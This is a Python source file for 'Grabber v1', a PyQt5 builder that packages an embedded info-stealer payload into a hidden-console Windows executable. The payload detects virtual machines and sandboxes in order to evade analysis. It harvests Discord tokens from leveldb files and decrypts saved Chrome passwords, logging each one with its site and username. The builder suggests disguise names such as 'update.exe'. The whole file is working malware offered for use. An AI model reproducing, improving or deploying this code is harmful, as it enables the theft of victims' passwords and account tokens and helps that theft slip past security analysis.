import sys, os, subprocess, shutil, base64, json, sqlite3, win32crypt, ctypes
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from datetime import datetime
import requests, threading, time, glob, sqlite3, shutil
from Crypto.Cipher import AES
import win32gui, win32con, win32api, win32ui
from PIL import ImageGrab


STEALER_CODE = '''
import os, sys, json, sqlite3, shutil, base64, win32crypt, ctypes
from datetime import datetime
from Crypto.Cipher import AES
import requests
import ctypes.wintypes

LOG_FILE = f"log_{os.environ['COMPUTERNAME']}.txt"

def write_log(data):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(data + "\\n")

def is_vm():
    try:
        vm_processes = ["vbox", "vmware", "vmtools", "qemu", "xenserver", "parallels"]
        for proc in vm_processes:
            try:
                if os.system(f'tasklist /FI "IMAGENAME eq {proc}*" 2>nul | find /I "{proc}" >nul') == 0:
                    return True
            except:
                pass
        if os.path.exists("C:\\\\Program Files\\\\Sandboxie") or os.path.exists("C:\\\\Program Files (x86)\\\\Sandboxie"):
            return True
        suspicious = ["sbiedll.dll", "vbox.dll", "vmware.dll"]
        for dll in suspicious:
            try:
                if ctypes.windll.kernel32.GetModuleHandleW(dll):
                    return True
            except:
                pass
        return False
    except:
        return False

def get_chrome_encryption_key():
    try:
        local_state_path = os.getenv('LOCALAPPDATA') + "\\\\Google\\\\Chrome\\\\User Data\\\\Local State"
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except:
        return None

def decrypt_password(encrypted_bytes, key):
    try:
        nonce = encrypted_bytes[3:15]
        ciphertext = encrypted_bytes[15:-16]
        tag = encrypted_bytes[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode('utf-8')
    except:
        try:
            return win32crypt.CryptUnprotectData(encrypted_bytes, None, None, None, 0)[1].decode('utf-8')
        except:
            return "DECRYPT_FAIL"

def get_discord_tokens():
    local = os.getenv('LOCALAPPDATA')
    roamin = os.getenv('APPDATA')
    paths = [
        local + "\\\\Discord\\\\Local Storage\\\\leveldb",
        local + "\\\\DiscordCanary\\\\Local Storage\\\\leveldb",
        roamin + "\\\\discord\\\\Local Storage\\\\leveldb",
        local + "\\\\DiscordPTB\\\\Local Storage\\\\leveldb"
    ]
    tokens_found = []
    write_log("=== DISCORD TOKENS ===")
    for p in paths:
        if os.path.exists(p):
            for f in os.listdir(p):
                if f.endswith('.log') or f.endswith('.ldb'):
                    try:
                        with open(os.path.join(p,f), 'rb') as file:
                            raw_data = file.read()
                            try:
                                content = raw_data.decode('utf-8', errors='ignore')
                            except:
                                content = raw_data.decode('utf-8', errors='replace')
                            
                            for token in content.split('"'):
                                if token.startswith('mfa.') or token.startswith('ND') or token.startswith('MT') or token.startswith('OT'):
                                    if len(token) > 30 and token not in tokens_found:
                                        if ' ' not in token and '@' not in token and 'CM' not in token and '0v0' not in token:
                                            write_log(f"DISCORD_TOKEN: {token}")
                                            tokens_found.append(token)
                    except Exception as e:
                        write_log(f"Error reading {f}: {str(e)}")
    if not tokens_found:
        write_log("No valid Discord tokens found.")

def get_chrome_passwords():
    key = get_chrome_encryption_key()
    if not key:
        write_log("=== PASSWORDS (DPAPI fallback) ===")
    else:
        write_log("=== PASSWORDS (AES decrypted) ===")
    
    path = os.getenv('LOCALAPPDATA') + "\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"
    
    if not os.path.exists(path):
        write_log("No passwords found.")
        return
    
    try:
        shutil.copyfile(path, "LoginData_copy.db")
        conn = sqlite3.connect("LoginData_copy.db")
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        found = 0
        for row in rows:
            enc = row[2]
            if enc:
                if key:
                    dec = decrypt_password(enc, key)
                else:
                    try:
                        dec = win32crypt.CryptUnprotectData(enc)[1].decode('utf-8')
                    except:
                        dec = "DECRYPT_FAIL"
                if dec != "DECRYPT_FAIL" and dec and len(dec) > 1:
                    write_log(f"PASS: {row[0]} | user: {row[1]} | pass: {dec}")
                    found += 1
        conn.close()
        os.remove("LoginData_copy.db")
        if found == 0:
            write_log("No passwords found.")
    except Exception as e:
        write_log("No passwords found.")

def main():
    # VM_DETECTION will be replaced with True/False during build
    VM_DETECTION = {VM_TOGGLE}
    
    if VM_DETECTION and is_vm():
        return
    
    write_log(f"=== STEALER RUN on {os.environ['COMPUTERNAME']} @ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===")
    get_discord_tokens()
    get_chrome_passwords()
    write_log("=== END ===")

if __name__ == "__main__":
    main()
'''


class BuildWorker(QThread):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)
    status_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(bool, str)

    def __init__(self, exe_name, script_code, vm_toggle):
        super().__init__()
        self.exe_name = exe_name
        self.script_code = script_code
        self.vm_toggle = vm_toggle

    def run(self):
        try:
            self.log_signal.emit(f"[{datetime.now().strftime('%H:%M:%S')}] Build started for {self.exe_name}")
            self.log_signal.emit(f"[INFO] VM Detection: {'ON' if self.vm_toggle else 'OFF'}")
            
            build_dir = os.path.join(os.environ.get('TEMP', os.getcwd()), "grabber_build")
            if not os.path.exists(build_dir):
                os.makedirs(build_dir, exist_ok=True)
            
            self.log_signal.emit(f"[INFO] Build dir: {build_dir}")
            self.progress_signal.emit(10)

            final_code = self.script_code.replace("{VM_TOGGLE}", "True" if self.vm_toggle else "False")

            script_path = os.path.join(build_dir, "stealer_script.py")
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(final_code)
            
            self.progress_signal.emit(20)

            script_path_raw = script_path.replace('\\', '/')

            spec_content = f'''# -*- mode: python ; coding: utf-8 -*-
block_cipher = None
a = Analysis(
    [r'{script_path_raw}'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=['win32crypt', 'Crypto', 'PIL', 'requests', 'win32gui', 'win32ui', 'win32con', 'win32api'],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyd = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
exe = EXE(
    pyd,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='{self.exe_name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None
)
'''
            spec_path = os.path.join(build_dir, "stealer.spec")
            with open(spec_path, "w", encoding="utf-8") as f:
                f.write(spec_content)
            
            self.progress_signal.emit(30)

            python_exe = sys.executable
            cmd = f'"{python_exe}" -m PyInstaller --noconfirm --log-level=WARN "{spec_path}"'
            self.log_signal.emit(f"$ {cmd}")
            
            self.progress_signal.emit(40)
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=build_dir, timeout=300)
            
            if result.returncode != 0:
                self.log_signal.emit("BUILD ERROR:")
                self.log_signal.emit(result.stderr)
                self.status_signal.emit("build failed")
                self.progress_signal.emit(0)
                self.finished_signal.emit(False, "")
                return
            
            self.progress_signal.emit(80)
            
            src_exe = os.path.join(build_dir, "dist", self.exe_name)
            dst_exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), self.exe_name)
            
            if os.path.exists(src_exe):
                shutil.copy2(src_exe, dst_exe)
                size_bytes = os.path.getsize(dst_exe)
                size_kb = size_bytes // 1024
                self.log_signal.emit(f"✅ EXE created: {dst_exe} (size {size_kb} KB)")
                self.progress_signal.emit(100)
                self.status_signal.emit(f"ready: {self.exe_name}")
                self.finished_signal.emit(True, dst_exe)
            else:
                self.log_signal.emit("❌ EXE not found after build")
                self.log_signal.emit(f"   Searched in: {src_exe}")
                self.status_signal.emit("build failed")
                self.progress_signal.emit(0)
                self.finished_signal.emit(False, "")
            
            try:
                shutil.rmtree(build_dir, ignore_errors=True)
            except:
                pass
                
        except subprocess.TimeoutExpired:
            self.log_signal.emit("ERROR: Build timed out (300 seconds)")
            self.status_signal.emit("timeout")
            self.progress_signal.emit(0)
            self.finished_signal.emit(False, "")
        except Exception as e:
            self.log_signal.emit(f"EXCEPTION: {str(e)}")
            self.status_signal.emit("error")
            self.progress_signal.emit(0)
            self.finished_signal.emit(False, "")


class GrabberBuilder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Grabber v1")
        self.setFixedSize(650, 550)
        self.setStyleSheet("""
            QMainWindow { background-color: #0d0d0d; border: 2px solid #1e1e1e; border-radius: 12px; }
            QLabel { color: #c0c0c0; font: 12px 'Segoe UI'; }
            QPushButton { background: #1c1c1c; color: #fff; border: 1px solid #333; border-radius: 10px; padding: 12px; font: bold 13px; }
            QPushButton:hover { background: #2a2a2a; border: 1px solid #666; }
            QPushButton:pressed { background: #000; border: 1px solid #aaa; }
            QPushButton:disabled { color: #555; background: #0d0d0d; border: 1px solid #1a1a1a; }
            QTextEdit { background: #111; color: #aaa; border: 1px solid #2a2a2a; border-radius: 6px; font: 10px 'Consolas'; }
            QLineEdit { background: #181818; color: #ddd; border: 1px solid #2c2c2c; border-radius: 6px; padding: 6px; }
            QCheckBox { color: #c0c0c0; font: 12px 'Segoe UI'; }
            QCheckBox::indicator { width: 18px; height: 18px; border: 1px solid #333; border-radius: 4px; background: #1a1a1a; }
            QCheckBox::indicator:checked { background: #2e5a2e; border: 1px solid #4a8a4a; }
            QProgressBar { background: #1a1a1a; border: 1px solid #333; border-radius: 5px; color: #fff; text-align: center; }
            QProgressBar::chunk { background: #2e5a2e; border-radius: 5px; }
        """)
        self.initUI()
        self.worker = None

    def initUI(self):
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setSpacing(12)
        layout.setContentsMargins(25, 20, 25, 20)

        title = QLabel("⚫ GRABBER v1")
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet("font-size: 20px; color: #e8e8e8; background: #141414; border-radius: 8px; padding: 10px;")
        layout.addWidget(title)

        self.output_name = QLineEdit()
        self.output_name.setPlaceholderText("output EXE name (e.g. update.exe)")
        self.output_name.setText("grabber.exe")
        layout.addWidget(QLabel("Output file name:"))
        layout.addWidget(self.output_name)

        self.vm_toggle = QCheckBox("Anti-VM / Anti-Sandbox")
        self.vm_toggle.setChecked(True)
        layout.addWidget(self.vm_toggle)

        self.build_log = QTextEdit()
        self.build_log.setReadOnly(True)
        self.build_log.setPlaceholderText("build log...")
        layout.addWidget(QLabel("Build log:"))
        layout.addWidget(self.build_log)

        self.progress = QProgressBar()
        self.progress.setRange(0, 100)
        layout.addWidget(self.progress)

        btn_row = QHBoxLayout()
        self.build_btn = QPushButton("🔨 BUILD EXE")
        self.build_btn.clicked.connect(self.start_build)
        self.clear_btn = QPushButton("🗑 CLEAR LOG")
        self.clear_btn.clicked.connect(self.build_log.clear)
        btn_row.addWidget(self.build_btn)
        btn_row.addWidget(self.clear_btn)
        layout.addLayout(btn_row)

        self.status_label = QLabel("ready to build")
        self.status_label.setAlignment(Qt.AlignRight)
        self.status_label.setStyleSheet("color: #555; font-size: 10px;")
        layout.addWidget(self.status_label)

    def start_build(self):
        if self.worker and self.worker.isRunning():
            return
        
        exe_name = self.output_name.text().strip()
        if not exe_name:
            exe_name = "grabber.exe"
        if not exe_name.endswith(".exe"):
            exe_name += ".exe"
        
        vm_enabled = self.vm_toggle.isChecked()
        
        self.build_btn.setEnabled(False)
        self.build_btn.setText("⏳ BUILDING...")
        self.status_label.setText("building...")
        self.progress.setValue(0)
        self.build_log.append("=== BUILD STARTED ===")
        
        self.worker = BuildWorker(exe_name, STEALER_CODE, vm_enabled)
        self.worker.log_signal.connect(self.build_log.append)
        self.worker.progress_signal.connect(self.progress.setValue)
        self.worker.status_signal.connect(self.status_label.setText)
        self.worker.finished_signal.connect(self.build_finished)
        self.worker.start()

    def build_finished(self, success, filepath):
        self.build_btn.setEnabled(True)
        self.build_btn.setText("🔨 BUILD EXE")
        if success:
            self.build_log.append("=== BUILD COMPLETED SUCCESSFULLY ===")
            self.status_label.setText(f"ready: {os.path.basename(filepath)}")
        else:
            self.build_log.append("=== BUILD FAILED ===")
            if self.status_label.text() == "building...":
                self.status_label.setText("build failed")
        self.worker = None

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    window = GrabberBuilder()
    window.show()
    sys.exit(app.exec_())
